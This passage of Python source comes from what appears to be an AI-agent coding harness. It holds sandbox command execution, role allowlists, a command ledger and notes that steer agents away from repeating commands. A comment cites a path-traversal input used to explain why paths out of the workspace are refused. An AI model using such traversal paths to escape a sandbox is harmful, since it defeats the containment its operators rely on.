    argv = [str(part) for part in command]
    try:
        entries = read_execution_ledger(repo_root, by_the_agents=True)
    except Exception:  # noqa: BLE001 - a hint must never fail the command
        return 0
    entries = [e for e in entries if _same_invocation(e, argv, working_directory)]
    # Only the passes this stage was shown. The refusal and the note both say
    # "you already have the answer", which is true of a pass this stage ran and
    # false of one another stage ran. One run's `defect_fix_1_1` was told to
    # reproduce its defect, asked for `npm test`, and was refused because
    # three earlier stages had passed it - output it had never seen. It spent
    # some twenty calls on `cat`, `read_command_output` with a stage name as the
    # reference, and a delete it was refused, hunting for that output. Outside a
    # run there is no stage, and every entry counts as before.
    stage = _the_stage_running_now()
    if stage:
        entries = [e for e in entries if e.get("stage") == stage]
    passes = [
        entry
        for entry in entries
        if True
        and (
            _as_exit_code(entry.get("returncode")) == 0
            # A search that found nothing ran perfectly well, and repeating it
            # is the same waste as repeating one that found something.
            or _ran_and_answered(argv, _as_exit_code(entry.get("returncode")))
        )
    ]
    if not passes:
        return 0
    return sum(
        1
        for entry in passes
        if not _written_since(repo_root, entry.get("at"), working_directory)
    )



def refused_this_way_before(
    repo_root: str, command: Sequence[str], working_directory: str | None = None
) -> int:
    """How many times this exact command has already been refused this run.

    No `_written_since` gate, and that is the whole point. A failing test can
    be fixed by editing the file it runs, so a write clears what came before;
    a command the allowlist refuses is refused for what it *is*, and no edit
    anywhere in the workspace will change that.

    Measured on one run's `specialist_backend_0`: `node -e "const pkg =
    require(...)"` refused at 23:44:29 with a message naming the way round
    (put the code in a file, run the file, remove it), and sent again
    unchanged at 23:44:41. The agent had edited and deleted files in between,
    which is exactly why the write gate must not apply here - it would have
    called that a fresh situation and said nothing.
    """
    argv = [str(part) for part in command]
    try:
        entries = read_execution_ledger(repo_root, by_the_agents=True)
    except Exception:  # noqa: BLE001 - a hint must never fail the command
        return 0
    return sum(
        1
        for entry in entries
        if _same_invocation(entry, argv, working_directory)
        and entry.get("error")
        and _as_exit_code(entry.get("returncode")) is None
    )


def _is_a_standing_refusal(
    command: Sequence[str], role_name: str, repo_root: str | Path | None = None
) -> bool:
    """Whether the allowlist refuses this command for what it is.

    Asked of `validate_command` rather than sniffed from the error text or
    recorded by tagging each of the eight places that can return an error -
    the tagging version is the "reached twelve of thirteen" mistake this
    codebase has made four times. `validate_command` is a pure function of
    argv, role and the stack pinned in the workspace, none of which changes
    while a command runs, so asking it again is deterministic and cheap.

    This deliberately says no to a timeout and to a sandbox that would not
    start. Those are not properties of the command: an edit can end an
    infinite loop, and a busy machine frees up.
    """
    try:
        validate_command(command, role_name, repo_root)
    except CommandNotAllowed:
        return True
    except Exception:  # noqa: BLE001 - unknown means "not a standing refusal"
        return False
    return False


#: One command at a time per workspace.
#:
#: Parallel execution mode fans a milestone's specialists out to run at once,
#: and they share one workspace. Measured on one run, the first parallel
#: run: three specialists issued `npm install` in `simple-to-do-list-app` at
#: 04:54:23, to the second, and npm tore its own tree apart -
#:
#:     npm error code ENOTEMPTY
#:     npm error syscall rmdir
#:     npm error path simple-to-do-list-app/node_modules/playwright-core/lib/vit...
#:
#: - then two of them ran `npm test` together at 04:55:29, where a Playwright
#: `webServer` binds one port and a runner writes one `test-results/`.
#:
#: Linear mode could not produce this: one stage ran at a time, which is the
#: assumption every tool in this package was written under. Nothing about the
#: commands is wrong, and no allowlist or category can fix it - the fault is two
#: of them at once in one directory.
#:
#: Serialising *every* command rather than only the ones known to collide, for
#: two reasons. The set that collides is not knowable up front: installs tear at
#: `node_modules`, test runners bind ports and share output directories, builds
#: write one `dist/`, and a formatter rewrites files another command is reading.
#: And it costs almost nothing here - what parallel mode is for is the model
#: calls, which take 9 to 13 seconds each and number in the hundreds, against a
#: handful of commands per milestone.
#:
#: Held across the checks as well as the run, which is what turns the collision
#: into saved work: the second `npm install` now sees the first one's ledger
#: entry and `succeeded_this_way_before` withholds it instead of repeating it.
_WORKSPACE_COMMAND_LOCKS: dict[str, threading.Lock] = {}
_LOCK_REGISTRY = threading.Lock()


def _the_lock_for(repo_root: str) -> threading.Lock:
    """The one lock for this workspace, created on first use."""
    key = os.path.realpath(str(repo_root))
    with _LOCK_REGISTRY:
        lock = _WORKSPACE_COMMAND_LOCKS.get(key)
        if lock is None:
            lock = threading.Lock()
            _WORKSPACE_COMMAND_LOCKS[key] = lock
        return lock


#: How many places one note names a file of the same name. Past a handful the
#: note is longer than the correction it is asking for.
MAX_PLACES_NAMED = 3

#: An argument that names a file: a last segment with a short extension. A flag
#: is never a path, and a bare directory or a glob cannot be resolved this way.
_NAMES_A_FILE = re.compile(r"^[^-][\w./+-]*\.[A-Za-z0-9]{1,6}$")


def _where_the_files_it_named_actually_are(
    repo_root: str,
    command: Sequence[str],
    working_directory: str | None = None,
) -> str:
    """For a command that failed, where the files it named are, or "".

    A failed command's own arguments say what it was looking for, and the
    workspace says where that is. Nothing put the two together, so a command
    run from the wrong directory got advice about the command instead of the
    location.

    Measured live on one run's `specialist_ui_ux_4`, four calls in 36
    seconds:

        09:00:16  node --test main.test.js storage.test.js   wd=(none)  exit 1
        09:00:19  node --test main.test.js storage.test.js   wd=the project  exit 1
        09:00:38  node --test main.test.js                   wd=(none)  exit 1
        09:00:44  node --test main.test.js                   wd=(none)  exit 1
        09:00:52  node --test main.test.js                   wd=(none)  exit 1

    Every one of the wd-less calls answered `Could not find 'main.test.js'`,
    and the repeat note fired correctly on the last two - "already failed 1
    time(s) ... change the command, or change the file it runs". Both of those
    are the wrong move: the command was right and the file was fine. It was in
    the project directory, which the second call had already used and which the
    workspace could have named at the first failure.

    Reads the command's arguments rather than the runner's error text, so it is
    not about any one runner: `node --test x.test.js`, `pytest tests/x.py`,
    `go test ./x_test.go`, `javac Main.java` and `ruby spec/x_spec.rb` all name
    what they could not find in the same place, as an argument.

    Never raises, and says nothing at all unless it can name somewhere real.
    """
    try:
        base = _resolve_a_working_directory(repo_root, working_directory)
        wanted: list[str] = []
        for argument in [str(part) for part in command][1:]:
            if not _NAMES_A_FILE.match(argument):
                continue
            if os.path.exists(os.path.join(base, argument)):
                continue
            if argument not in wanted:
                wanted.append(argument)
        if not wanted:
            return ""

        # One walk for every missing argument, pruning as it descends. A failed
        # command is a bad moment to pay for a full `node_modules` listing.
        by_name: dict[str, list[str]] = {name: [] for name in wanted}
        basenames = {os.path.basename(name): name for name in wanted}
        for directory, subdirectories, files in os.walk(repo_root):
            subdirectories[:] = [
                name
                for name in subdirectories
                if name not in IGNORED_DIRECTORIES
                and name not in _RUNNER_OUTPUT_DIRECTORIES
            ]
            for name in files:
                argument = basenames.get(name)
                if argument is None:
                    continue
                found = by_name[argument]
                if len(found) < MAX_PLACES_NAMED:
                    found.append(
                        os.path.relpath(os.path.join(directory, name), repo_root)
                    )
    except Exception:  # noqa: BLE001 - a hint must never fail the command
        return ""

    parts: list[str] = []
    for argument, places in by_name.items():
        if not places:
            continue
        where = ", ".join(sorted(places))
        parts.append(
            f"`{argument}` is not in the directory this ran in, but a file of "
            f"that name is at {where}. Either pass that path or set "
            f"`working_directory` to the directory holding it."
        )
    return " ".join(parts)


#: How many task names one note lists. A project with fifty make targets does
#: not need all of them to answer "which one runs the tests".
MAX_TASKS_NAMED = 12

#: Task names that read as "run this project's suite". Only for these does the
#: note add that the gates measure the suite by this command - said about a
#: `build` script it would be false.
_A_TEST_TASK = frozenset({"test", "tests", "check", "checks", "spec", "specs",
                          "verify", "unit", "ci"})

#: A package manager's own subcommands, which are never a task the project
#: defined. Without these, a failed `pnpm install` would be reported as an
#: undefined script.
_NOT_A_TASK = frozenset({
    "install", "i", "ci", "add", "remove", "rm", "uninstall", "update", "up",
    "upgrade", "outdated", "audit", "list", "ls", "link", "unlink", "why",
    "exec", "dlx", "create", "init", "publish", "pack", "login", "logout",
    "whoami", "config", "cache", "help", "version", "view", "info", "search",
    "prune", "dedupe", "fund", "doctor", "rebuild", "explain", "import",
    "licenses", "set", "get", "store", "patch", "deploy", "env", "x", "run",
    "task", "workspace", "workspaces", "bin", "root", "ping", "access", "team",
    "owner", "star", "unstar", "token", "adduser", "hook", "org", "profile",
    "shrinkwrap", "completion", "edit", "docs", "repo", "bugs", "diff",
})


def _keys_of_a_json_table(text: str, *tables: str) -> list[str]:
    """The keys of the first of `tables` this JSON document has as an object.

    Raises for a document that is not an object at all, so that "this manifest
    cannot be read" stays distinct from "it declares nothing": a manifest that
    is a JSON array is its own reported problem, and saying it declares no
    scripts would be describing it as valid.
    """
    document = json.loads(text)
    if not isinstance(document, dict):
        raise ValueError("a manifest is an object")
    for table in tables:
        section = document.get(table)
        if isinstance(section, dict):
            return [str(key) for key in section]
    return []


def _scripts_in_a_package_json(text: str) -> list[str]:
    return _keys_of_a_json_table(text, "scripts")


def _a_task_declared_at_the_top_level(text: str, task: str) -> bool:
    """Whether a manifest declares `task` outside its `scripts` table.

    A manifest of `{"test": "node --test ./tests"}` is answered by `npm test`
    with `Missing script: "test"`, which is true and reads as though the name
    were absent. It is present, one level too high, and that is a different
    correction from adding it. Seen in the stored workspaces of one run.
    """
    try:
        document = json.loads(text)
    except ValueError:
        return False
    return isinstance(document, dict) and isinstance(document.get(task), str)


def _tasks_in_a_deno_manifest(text: str) -> list[str]:
    return _keys_of_a_json_table(text, "tasks")


#: A make target: a name at the start of a line followed by a colon. `:=` is an
#: assignment and `.PHONY` and friends are directives, not targets.
_A_MAKE_TARGET = re.compile(r"^([A-Za-z0-9][\w.%/-]*)\s*:(?!=)", re.MULTILINE)

#: A just recipe, which may declare parameters before its colon.
_A_JUST_RECIPE = re.compile(r"^([a-zA-Z0-9][\w-]*)(?:\s+[^:\n]*)?:(?!=)", re.MULTILINE)

#: A rake task, in either quoting style, with or without a dependency list.
_A_RAKE_TASK = re.compile(r"^\s*(?:task|multitask)\s+[:\'\"]([\w:-]+)", re.MULTILINE)

#: A tox environment or a nox session.
_A_TOX_ENV = re.compile(r"^\[testenv:([^\]]+)\]", re.MULTILINE)
_A_NOX_SESSION = re.compile(r"^def\s+(\w+)\s*\(", re.MULTILINE)


def _targets_in_a_makefile(text: str) -> list[str]:
    return [name for name in _A_MAKE_TARGET.findall(text) if not name.startswith(".")]


def _recipes_in_a_justfile(text: str) -> list[str]:
    return list(_A_JUST_RECIPE.findall(text))


def _tasks_in_a_rakefile(text: str) -> list[str]:
    return list(_A_RAKE_TASK.findall(text))


def _envs_in_a_tox_config(text: str) -> list[str]:
    return [name.strip() for name in _A_TOX_ENV.findall(text)]


def _sessions_in_a_noxfile(text: str) -> list[str]:
    return list(_A_NOX_SESSION.findall(text))


def _scripts_in_a_pyproject(text: str) -> list[str]:
    """Every script table pyproject is used to declare tasks in."""
    document = tomllib.loads(text)
    tool = document.get("tool") or {}
    names: list[str] = []
    for table in (
        document.get("project", {}).get("scripts"),
        (tool.get("poetry") or {}).get("scripts"),
        (tool.get("pdm") or {}).get("scripts"),
        (tool.get("taskipy") or {}).get("tasks"),
        (tool.get("rye") or {}).get("scripts"),
        (tool.get("uv") or {}).get("scripts"),
    ):
        if isinstance(table, dict):
            names.extend(str(key) for key in table)
    environments = ((tool.get("hatch") or {}).get("envs") or {})
    if isinstance(environments, dict):
        for environment in environments.values():
            scripts = (environment or {}).get("scripts")
            if isinstance(scripts, dict):
                names.extend(str(key) for key in scripts)
    return names


#: The manifests a runner consults for the names it accepts, and how to read
#: the names out. Several runners share one manifest, and one runner can be
#: satisfied by more than one, so this is keyed by the file.
_WHERE_TASKS_ARE_DECLARED: tuple[tuple[tuple[str, ...], Any, str], ...] = (
    (("package.json",), _scripts_in_a_package_json, "scripts"),
    (("deno.json", "deno.jsonc"), _tasks_in_a_deno_manifest, "tasks"),
    (("composer.json",), _scripts_in_a_package_json, "scripts"),
    (("Makefile", "makefile", "GNUmakefile"), _targets_in_a_makefile, "targets"),
    (("justfile", "Justfile", ".justfile"), _recipes_in_a_justfile, "recipes"),
    (("Rakefile", "rakefile"), _tasks_in_a_rakefile, "tasks"),
    (("pyproject.toml",), _scripts_in_a_pyproject, "scripts"),
    (("tox.ini",), _envs_in_a_tox_config, "environments"),
    (("noxfile.py",), _sessions_in_a_noxfile, "sessions"),
)

#: Which manifests each runner would accept a name from, and how it is asked.
#: `after` are the subcommands whose next argument is a task name; a runner with
#: `bare` also takes one as its first argument.
_TASK_RUNNERS: tuple[tuple[str, tuple[str, ...], bool, tuple[str, ...]], ...] = (
    ("npm", ("run", "run-script"), True, ("package.json",)),
    ("yarn", ("run",), True, ("package.json",)),
    ("pnpm", ("run",), True, ("package.json",)),
    ("bun", ("run",), True, ("package.json",)),
    ("deno", ("task",), False, ("deno.json", "deno.jsonc")),
    ("composer", ("run", "run-script"), True, ("composer.json",)),
    ("make", (), True, ("Makefile", "makefile", "GNUmakefile")),
    ("gmake", (), True, ("Makefile", "makefile", "GNUmakefile")),
    ("just", (), True, ("justfile", "Justfile", ".justfile")),
    ("rake", (), True, ("Rakefile", "rakefile")),
    ("pdm", ("run",), False, ("pyproject.toml",)),
    ("rye", ("run",), False, ("pyproject.toml",)),
    ("hatch", ("run",), False, ("pyproject.toml",)),
    ("poetry", ("run",), False, ("pyproject.toml",)),
    ("tox", ("-e",), False, ("tox.ini", "pyproject.toml")),
    ("nox", ("-s", "--session"), False, ("noxfile.py",)),
)


def _the_task_a_command_asked_for(
    command: Sequence[str],
) -> tuple[str, tuple[str, ...]] | None:
    """The task name a command asked a runner to run, and where it is declared.

    Returns None for anything that is not that shape, which is most commands:
    `node --test x.js` names no task, and neither does `pnpm install`.
    """
    parts = [str(part) for part in command]
    if not parts:
        return None
    runner = os.path.basename(parts[0])
    if runner.endswith(".cmd") or runner.endswith(".exe"):
        runner = runner.rsplit(".", 1)[0]
    # `./gradlew`, `npx`, `yarn dlx` and friends delegate, and what they
    # delegate to is not decidable from the argv alone.
    for name, after, bare, manifests in _TASK_RUNNERS:
        if runner != name:
            continue
        arguments = parts[1:]
        for index, argument in enumerate(arguments):
            if argument in after and index + 1 < len(arguments):
                return arguments[index + 1], manifests
            # `-e py311` and `-epy311` are the same request.
            for flag in after:
                if flag.startswith("-") and argument.startswith(flag) and len(argument) > len(flag):
                    return argument[len(flag):].lstrip("="), manifests
        if not bare:
            return None
        for argument in arguments:
            if argument.startswith("-"):
                continue
            if argument in _NOT_A_TASK:
                return None
            return argument, manifests
        return None
    return None


def _the_tasks_this_project_defines(
    repo_root: str,
    command: Sequence[str],
    working_directory: str | None = None,
) -> str:
    """For a command that asked for a task that is not declared, what is, or "".

    A runner asked for a name its manifest does not define answers with its own
    vocabulary and nothing else. The names it *would* accept are in a file in
    the workspace, and nothing put the two together, so a stage that guessed the
    command wrong got the runner's complaint instead of the answer.

    Measured on one run, which failed its first sprint. `package.json` was
    written as `{"type": "module"}` - no `scripts` table at all - and the test
    rounds ran the project's gating command three times:

        test_round_0  npm test  ->  npm error Missing script: "test"
        test_round_1  npm test  ->  npm error Missing script: "test"
        test_round_2  npm test  ->  npm error Missing script: "test"

    Eighteen model turns across the three rounds, and not one of them added the
    script. `npm error Missing script: "test"` does not say that the manifest
    declares nothing, does not say which file it read, and does not say that the
    fix is a line in that file.

    Reads the manifest rather than the runner's error text, so it is not about
    any one runner or language: `npm run build`, `make test`, `just check`,
    `rake spec`, `composer run lint`, `deno task start`, `pdm run test`,
    `tox -e py311` and `nox -s lint` all name a task the same way, and the file
    that declares the accepted names is in the workspace in every case.

    Says nothing when it cannot read a manifest, when the name is defined, or
    when the command names no task - which is most commands. Never raises.
    """
    try:
        asked = _the_task_a_command_asked_for(command)
        if asked is None:
            return ""
        task, manifests = asked

        base = _resolve_a_working_directory(repo_root, working_directory)
        root = os.path.abspath(repo_root)
        readers = {
            name: (reader, noun)
            for names, reader, noun in _WHERE_TASKS_ARE_DECLARED
            for name in names
        }

        # Up from the directory it ran in to the workspace root, which is how
        # every one of these runners looks for its own manifest.
        directory = os.path.abspath(base)
        while True:
            for name in manifests:
                candidate = os.path.join(directory, name)
                if not os.path.isfile(candidate):
                    continue
                reader, noun = readers[name]
                relative = os.path.relpath(candidate, root)
                try:
                    with open(candidate, "r", encoding="utf-8", errors="replace") as handle:
                        text = handle.read()
                    declared = [str(found) for found in reader(text)]
                except Exception:  # noqa: BLE001 - an unreadable manifest is its own problem
                    return ""
                if task in declared:
                    return ""
                return _what_to_say_about_a_missing_task(
                    task, relative, noun, declared,
                    misplaced=_a_task_declared_at_the_top_level(text, task),
                )
            if directory == root or os.path.dirname(directory) == directory:
                return ""
            directory = os.path.dirname(directory)
    except Exception:  # noqa: BLE001 - a hint must never fail the command
        return ""


def _what_to_say_about_a_missing_task(
    task: str,
    manifest: str,
    noun: str,
    declared: Sequence[str],
    misplaced: bool = False,
) -> str:
    """The note for a task a manifest does not declare."""
    gating = ""
    if task.lower() in _A_TEST_TASK:
        gating = (
            " Every gate in this pipeline measures the suite by the project's own "
            "test command, so until that name resolves to something, no number it "
            "reads comes from your tests."
        )
    if misplaced:
        return (
            f"`{manifest}` does declare `{task}`, but at the top level of the "
            f"manifest rather than inside its `{noun}` table, which is the only "
            f"place the runner looks - so the name is there and unreachable. "
            f"Move it into `{noun}`."
            + gating
        )
    if not declared:
        return (
            f"`{manifest}` declares no {noun} at all, so `{task}` cannot resolve "
            f"to anything - the runner is not refusing your command, it has "
            f"nothing to look it up in. Add a `{task}` entry there that runs it."
            + gating
        )
    names = sorted(set(declared))
    shown = ", ".join(f"`{name}`" for name in names[:MAX_TASKS_NAMED])
    if len(names) > MAX_TASKS_NAMED:
        shown += f" and {len(names) - MAX_TASKS_NAMED} more"
    return (
        f"`{task}` is not one of the {noun} `{manifest}` declares. It declares "
        f"{shown}. Either use one of those or add `{task}` to that file."
        + gating
    )


def _a_silent_success(outcome: Dict[str, Any]) -> str:
    """What an exit code of 0 with nothing printed means, or "".

    One run's `specialist_testing_4` ran `npx playwright install chromium` with
    the browser already cached. It exited 0 in a second and printed nothing,
    and the stage sent the identical command four more times - the second
    before any repeat note existed to stop it - until it was refused. A result
    of `{"stdout": "", "stderr": "", "returncode": "0"}` reads as nothing
    having happened, not as success.

    Only for the first silent success: a repeat already gets
    `_note_about_running_this_again`, which says more.
    """
    if _as_exit_code(outcome.get("returncode")) != 0 or outcome.get("error"):
        return ""
    if str(outcome.get("stdout") or "").strip() or str(outcome.get("stderr") or "").strip():
        return ""
    return (
        "It exited 0 and printed nothing, which is success: a command with nothing "
        "to do - a package or browser already installed, a directory already there, "
        "a check that found no problem - usually says nothing. Running it again will "
        "print nothing again; go on to the next step."
    )


def _failures_a_later_sprint_owns(repo_root: str, since: float) -> str:
    """Which of a test command's failures are a later sprint's tests, or "". Never raises.

    See `app.acceptance.sprint_scope`: a builder shown a later sprint's failures
    beside its own, with nothing to tell them apart, built that sprint's work.
    """
    try:
        from app.acceptance import sprint_scope

        return sprint_scope.note_on_failures(repo_root, since)
    except Exception:  # noqa: BLE001 - a note must never fail the command
        return ""


def _note_about_running_this_again(
    repo_root: str,
    command: Sequence[str],
    outcome: Dict[str, Any],
    role_name: str,
    working_directory: str | None = None,
) -> str:
    """What to tell an agent that has just re-run a command unchanged.

    All three branches say the same thing - you already have this result - and
    ask for three different moves. A repeated failure has not changed what is
    broken; a repeated pass has finished and not noticed; a repeated refusal
    will never be allowed and needs a different command entirely.
    """
    exit_code = _as_exit_code(outcome.get("returncode"))
    if exit_code is None:
        if not outcome.get("error") or not _is_a_standing_refusal(
            command, role_name, repo_root
        ):
            return ""
        already = refused_this_way_before(repo_root, command, working_directory)
        if not already:
            return ""
        return (
            f"This exact command has already been refused {already} time(s) in this "
            "run, and it will be refused every time: it is not allowed for what it "
            "is, so no edit to any file will change the answer. Use the alternative "
            "the refusal names, or a different command."
        )
    if _ran_and_answered(command, exit_code):
        already = succeeded_this_way_before(repo_root, command, working_directory)
        if not already:
            return ""
        return (
            f"This exact search has already run {already} time(s) in this run and "
            "nothing has been written since. It exited 1 because it found no "
            "matches - the command worked, the text simply is not there, and "
            "running it again will find nothing again. Search a different file or "
            "a different pattern, or take "
            "\"it is not there\" for the answer and move on."
        )
    if exit_code != 0:
        already = failed_this_way_before(repo_root, command, working_directory)
        if not already:
            return ""
        return (
            f"This exact command has already failed {already} time(s) in this run. "
            "Running it again unchanged will fail again - change the command, or "
            "change the file it runs, before retrying."
        )
    already = succeeded_this_way_before(repo_root, command, working_directory)
    if not already:
        return ""
    return (
        f"This exact command has already passed {already} time(s) in this run and "
        "nothing has been written since, so this output is the one you already "
        "have. Re-running it cannot tell you anything new. This verification is "
        "finished: return your structured answer now, or change a file first if "
        "something is still wrong."
    )

def _outcome_of(entry: dict) -> str:
    """How one ledger entry ended, in the words the digest uses."""
    code = entry.get("returncode")
    return "OK" if code == 0 else (f"exit {code}" if code is not None else "refused")


def summarise_executions(repo_root: str) -> str:
    """A short digest of what actually ran, for a reviewer or a model.

    Chronological, and then where each command stands now. The second half is
    not a convenience: without it this digest is read as a verdict on the
    product, and it is a record of the work instead.

    One run's milestone reviewer is the case. It was handed

        25 command(s) executed, 4 succeeded:
        ... - [testing_specialist] npm test -> exit 1   (x4)
        ... - [testing_specialist] npm test -> OK

    and wrote a Major finding: "Test execution logs show multiple failures
    (exit 1) across several commands. The test suite does not pass." At that
    moment `npm test` in that workspace exited 0 with `# pass 4 # fail 0`. The
    reading was a fair one of what it was given - a fixed command is
    indistinguishable from a broken one when only the attempts are shown - and
    it sent the milestone back for a defect that did not exist.

    A command that failed and later succeeded has been fixed, and the failures
    are the record of fixing it. That is what the tail now says.
    """
    entries = read_execution_ledger(repo_root)
    if not entries:
        return "No commands were executed in this workspace."
    lines = []
    for entry in entries[-40:]:
        argv = " ".join(str(part) for part in entry.get("command") or [])
        lines.append(f"- [{entry.get('role', '?')}] {argv} -> {_outcome_of(entry)}")
    passed = sum(1 for e in entries if e.get("returncode") == 0)

    # Latest wins, insertion order kept, so the list reads in the order the
    # commands were first tried rather than alphabetically.
    latest: dict[str, str] = {}
    for entry in entries:
        argv = " ".join(str(part) for part in entry.get("command") or [])
        if argv:
            latest[argv] = _outcome_of(entry)
    standing = "\n".join(f"- {argv} -> {outcome}" for argv, outcome in latest.items())

    return (
        f"{len(entries)} command(s) executed, {passed} succeeded:\n"
        + "\n".join(lines)
        + "\n\nWhere each distinct command stands now, by its most recent run:\n"
        + standing
        + "\n\nJudge the product by this list, not by the attempts above. A "
        "command that failed earlier and succeeded later has been fixed, and "
        "those failures are the record of fixing it, not evidence against the "
        "product. Only a command whose most recent run failed is still failing."
    )


class SandboxExecutor:
    """Runs an argv list inside a locked-down throwaway container."""

    @staticmethod
    def _resolve_executable(name: str, workspace: str, run_in: str | None = None) -> str | None:
        """Find the binary to run, allowing ones the run installed for itself.

        A real build uses tools it installed: `.venv/bin/pytest`,
        `node_modules/.bin/vite`. Resolving only against PATH would make those
        unreachable and leave the agent unable to run the very things it just
        set up.

        A path is therefore accepted, but only after resolving it inside the
        workspace - otherwise `../../../usr/bin/whatever` would step straight
        past the allowlist, which matches on the basename.
        """
        if os.sep in name or (os.altsep and os.altsep in name):
            root = os.path.realpath(workspace)
            # A relative path is relative to where the command runs, which is
            # what `./scripts/check.sh` means to whoever typed it. The bound is
            # still the workspace root, checked below.
            base = os.path.realpath(run_in) if run_in else root
            # Normalised, not resolved: `..` is collapsed lexically so a path
            # out of the workspace is refused, while a symlink whose *target*
            # sits outside is still allowed. That distinction matters because
            # `python -m venv` builds exactly such a symlink - following it
            # would reject every virtualenv an agent creates for itself.
            #
            # Nothing is lost by permitting it. The role allowlist still matches
            # on the basename, and an agent already runs code it wrote itself
            # every time it does `python app.py`; the allowlist bounds which
            # interpreters exist, not whether the agent's own code runs.
            candidate = os.path.normpath(os.path.join(base, name))
            if candidate != root and not candidate.startswith(root + os.sep):
                raise CommandNotAllowed(
                    f"'{name}' points outside the workspace. Run a tool from the "
                    "workspace or one the environment provides, not a path out of it."
                )
            return candidate if os.access(candidate, os.X_OK) else None
        return shutil.which(name, path=os.environ.get("PATH", ""))

    @classmethod
    def _execute_here(
        cls,
        argv: list[str],
        workspace: str,
        role_name: str,
        category: str,
        timeout: int,
        extra_env: Dict[str, str] | None,
        run_in: str | None = None,
    ) -> Dict[str, Any]:
        """Run a validated command in this container, in the run's workspace.

        The command has already passed the same checks as the container path -
        argv only so there is no shell, exact executable match against the
        role's allowlist, and argument screening for the forms that turn an
        allowed interpreter back into a general one. What differs is only the
        blast radius if something gets through.
        """
        try:
            executable = cls._resolve_executable(argv[0], workspace, run_in)
        except CommandNotAllowed as exc:
            return {"error": str(exc)}
        if executable is None:
            return {
                "error": (
                    f"'{argv[0]}' is not installed in this environment. Install it into "
                    "the workspace first (for example `python -m venv .venv` then "
                    "`.venv/bin/pip install ...`, or `npm install`), or ask for a tool "
                    "the image already provides."
                )
            }

        logger.info(
            "sandbox exec (in-container) role=%s category=%s argv=%s",
            role_name, category, argv,
        )
        try:
            result = _run_and_watch_the_tree(
                [executable, *argv[1:]],
                cwd=run_in or workspace,
                env=_child_environment(workspace, extra_env),
                timeout=timeout,
            )
        except subprocess.TimeoutExpired as expired:
            return {
                "error": f"Command timed out after {timeout} seconds." + _timeout_advice(workspace, run_in, argv),
                "stdout": _as_workspace_relative(_truncate(expired.stdout or "" if isinstance(expired.stdout, str) else "", f"{role_name}-{argv[0]}-stdout", workspace), workspace),
                "stderr": _as_workspace_relative(_truncate(expired.stderr or "" if isinstance(expired.stderr, str) else "", f"{role_name}-{argv[0]}-stderr", workspace), workspace),
                "returncode": "124",
            }
        except _TreeOverBudget as over:
            return {
                "error": (
                    f"Command stopped: its processes together were using {over.used_mb} MB, "
                    f"past the {over.budget_mb} MB this container can give one command. "
                    "Left running, the kernel would have killed this run instead of the "
                    "command. A test runner usually reaches this by starting one worker "
                    "per CPU, each loading the whole project, or by a test that grows a "
                    "structure without end. Run it in one process (the runner's "
                    "in-band or single-worker option), or one test file at a time."
                ),
                "stdout": _as_workspace_relative(_truncate(over.stdout, f"{role_name}-{argv[0]}-stdout", workspace), workspace),
                "stderr": _as_workspace_relative(_truncate(over.stderr, f"{role_name}-{argv[0]}-stderr", workspace), workspace),
                "returncode": "137",
            }
        except OSError as exc:
            return {"error": f"Could not run '{argv[0]}': {exc}"}

        return {
            "stdout": _as_workspace_relative(_truncate(result.stdout, f"{role_name}-{argv[0]}-stdout", workspace), workspace),
            "stderr": _as_workspace_relative(_truncate(result.stderr, f"{role_name}-{argv[0]}-stderr", workspace), workspace),
            "returncode": str(result.returncode),
        }

    @classmethod
    def execute(
        cls,
        command: Sequence[str],
        repo_root: str,
        role_name: str = "general",
        category: str = "default",
        extra_env: Dict[str, str] | None = None,
        working_directory: str | None = None,
        *,
        for_the_harness: bool = False,
    ) -> Dict[str, Any]:
        """Run one command and record that it happened.

        `for_the_harness` is the harness running a command itself: the guards
        that steer an agent away from repeating itself do not apply, and the
        run does not count toward an agent's repeats. See `_FOR_THE_HARNESS`.

        A thin recording wrapper around `_run`, rather than a `_record_execution`
        call at each of the eight places that return: one entry point cannot be
        forgotten when a ninth is added, and refusals - which return early - are
        captured on the same path as successes.
        """
        # An install with no directory given used to be refused, with a message
        # naming the directory to use instead. One run spent two calls on
        # that: bare `npm install`, refused, then the identical command with
        # the directory filled in. The refusal could only ever name one
        # directory - a project is pinned, and there is one - so run it there
        # and say so. Doing what the refusal asked for costs the run nothing
        # and saves it a call.
        #
        # A command that carries its own `working_directory` or `--prefix` is
        # left alone either way: it has said where it means, including when
        # that is the root.
        started = time.monotonic()
        if category == "default" and _fetches_dependencies(command):
            category = "install"
        elif category == "default" and _runs_tests(command):
            category = "test"
        token = _FOR_THE_HARNESS.set(bool(for_the_harness))
        try:
            with _the_lock_for(repo_root):
                return cls._execute_serialised(
                    command, repo_root, role_name, category, extra_env, working_directory, started
                )
        finally:
            _FOR_THE_HARNESS.reset(token)

    @classmethod
    def _execute_serialised(
        cls,
        command: Sequence[str],
        repo_root: str,
        role_name: str,
        category: str,
        extra_env: Dict[str, str] | None,
        working_directory: str | None,
        started: float,
    ) -> Dict[str, Any]:
        """`execute`'s body, with this workspace's command lock held.

        Split out so the lock is taken in exactly one place and cannot be
        skipped by an early return - there are several, and a refusal that
        returns before the lock is released would deadlock every other worker.
        """
        belongs_in = (
            None if working_directory else the_project_this_command_belongs_in(command, repo_root)
        )
        redirected = None
        if belongs_in:
            working_directory = belongs_in
            redirected = (
                f"Ran this in '{belongs_in}' rather than the workspace root, which is "
                "where this run's project lives. At the root it would have created a "
                "second package.json, and the tests would then run under the wrong "
                f"one. Pass working_directory='{belongs_in}' to say so yourself."
            )

        # Before the doubled-directory check and before validation: a leading
        # `cd <dir> &&` that names the directory already in force is the agent
        # saying the same thing twice, not a different command.
        command, redundant_cd = strip_a_redundant_cd(command, working_directory)
        command, doubled = strip_a_doubled_working_directory(
            command, repo_root, working_directory
        )
        # Before running it: a command that timed out will time out again, and
        # unlike every other repeated failure this one is paid for in wall
        # clock as well as a model call. See `timed_out_this_way_before`.
        harness = running_for_the_harness()
        ruled_out = None if harness else _refuse_an_install_the_brief_rules_out(command, repo_root)
        if ruled_out:
            outcome = {"error": ruled_out}
            _record_execution(
                repo_root, role_name, command, outcome, working_directory, category,
                duration_seconds=time.monotonic() - started,
            )
            return outcome

        # A command that has already passed several times, with nothing written
        # between, is withheld rather than run again. See
        # `SUCCESSES_BEFORE_WITHHOLDING` for why the note alone was not enough.
        settled = 0 if harness else succeeded_this_way_before(repo_root, command, working_directory)
        if settled >= SUCCESSES_BEFORE_WITHHOLDING and not _ran_and_answered(
            command, 0
        ):
            outcome = {
                "error": (
                    f"Not running this again. It has already passed {settled} time(s) "
                    "in this run and nothing has been written since any of them, so "
                    "its output cannot have changed - you already have the answer, "
                    f"{settled} copies of it.\n\n"
